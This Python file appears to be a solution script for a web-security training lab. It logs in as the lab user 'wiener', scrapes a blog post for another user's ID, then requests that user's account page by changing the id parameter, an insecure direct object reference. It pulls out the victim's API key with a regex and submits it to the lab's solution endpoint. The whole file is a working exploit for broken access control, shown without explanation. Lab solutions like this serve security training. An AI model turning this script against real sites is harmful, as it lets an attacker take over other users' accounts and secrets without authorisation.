import requests
import sys
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse, parse_qs

#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def get_csrf_token(url, session):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def login(url, session):

    print("(+) Logging in as user Wiener...")
    login_page = url + "/login"
    csrf_token = get_csrf_token(login_page, session)
    login_data = {"csrf": csrf_token,"username": "wiener", "password": "peter"}

    response = session.post(login_page, data=login_data, allow_redirects=False)
    if response.status_code == 302:
        print("(+) Logged in successfully.")
        return session
    else:
        print("(+) Could not login!")
        print("(+) Exiting...")
        sys.exit(1)


def get_carlos_id(url, session):
    print("(+) Getting Carlos's ID")
    post_url = url + ("/post?postId=3")
    response = session.get(post_url)
    soup = BeautifulSoup(response.content, "html.parser")

    for link in soup.find_all("a", href=True):
        href = link["href"]

        parsed_url = urlparse(href)

        query_params = parse_qs(parsed_url.query)
        if "userId" in query_params:
            user_id_value = query_params["userId"][0]
            print(f"(+) Found Carlos's ID : {user_id_value}")
        
    get_carlos_api(url, session, user_id_value)

def get_carlos_api(url, session, user_id_value):
    print("(+) Getting Carlos's API Key...")
    carlos_account = url + "/my-account?id=" + user_id_value
    response=session.get(carlos_account)
    res = response.text
    key = (re.search ("Your API Key is:(.*)", res).group(1)).strip()
    api = key.split('</div>')[0]
    print('(+) The API Key is: ' + api)
    
    submit_key(url, api)

def submit_key(url, api):
    print("(+) Submitting the Key...")
    solution = {"answer": api}
    solution_url = url + "/submitSolution"
    response = requests.post(solution_url, data=solution)
    print("(+) Successfully completed the lab.")


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        sys.exit(1)

    print("(+) Starting the script...")
    url = sys.argv[1]
    session = requests.Session()
    login(url, session)
    get_carlos_id(url, session)

if __name__ == "__main__":
    main()